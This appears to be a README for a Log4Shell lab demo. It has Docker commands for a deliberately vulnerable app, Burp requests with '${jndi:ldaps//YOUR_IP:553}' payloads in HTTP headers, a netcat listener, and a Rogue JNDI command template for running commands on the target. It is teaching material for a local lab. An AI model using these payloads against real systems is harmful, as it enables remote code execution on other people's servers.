# Log4J-Demo

## What is Log4J? 

- A logging tool, written in Java, that is commonly used in many applications across the internet

## Setting Up Environment

First get the vulnerable docker and run it using [^1]: 

```sh
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
```

## Finding the Exploit 

The docker container will now be running on `localhost:8080`. Go there in *BurpSuit* and send the `GET` request to the repeter. The request should look something like this: 

```http
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Now we are going to see if the server is vulnerable to *Log4J*. First try changing the `HTTP` headers to the following `JNDI` command:

```
${jndi:ldaps//YOUR_IP:553}
```

We are now going to start listening on our local machine using *Netcat* to see if any of these headers worked: 

```sh
nc -lvnp 553
```

The `GET` request should now look something like this: 

```https
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-mobile: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-platform: ${jndi:ldaps//YOUR_IP:553}
Upgrade-Insecure-Requests: ${jndi:ldaps//YOUR_IP:553}
User-Agent: ${jndi:ldaps//YOUR_IP:553}
Accept: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Site: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Mode: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-User: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Dest: ${jndi:ldaps//YOUR_IP:553}
Accept-Encoding: ${jndi:ldaps//YOUR_IP:553}
Accept-Language: ${jndi:ldaps//YOUR_IP:553}
Connection: close
```

> **NOTE:** you will need to put in the `JNDI` request one by one to see which `HTTP` header is vulnerable. 

None of these `HTTP` headers are vulnerable, you can now try putting in new one to see if any of those are vulnerable. This server happens to have a *Log4J* vulnerablility on the `X-Api-Version` header. 

If you put the following response in the `HTTP` request, you should get a response in *Netcat*: 

```http
X-Api-Version: ${jndi:ldaps//YOUR_IP:553}
```

This tells you that the server is vulnerable to the exploit. 

## Exploitation 

We will be using a tool called [Rogue JNDI](https://github.com/veracode-research/rogue-jndi) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo to run it, use the following command as a template to run the `LDAP` server: 

```sh
java -jar target/RogueJndi-1.1.jar --command "COMMAND_TO_EXECUTE_ON_TARGET" --hostname "TARGET_IP"
```



### Are you Vulnerable? 

- https://github.com/NCSC-NL/log4shell

[^1]: [Docker container created by christophetd](https://github.com/christophetd/log4shell-vulnerabre-app) 
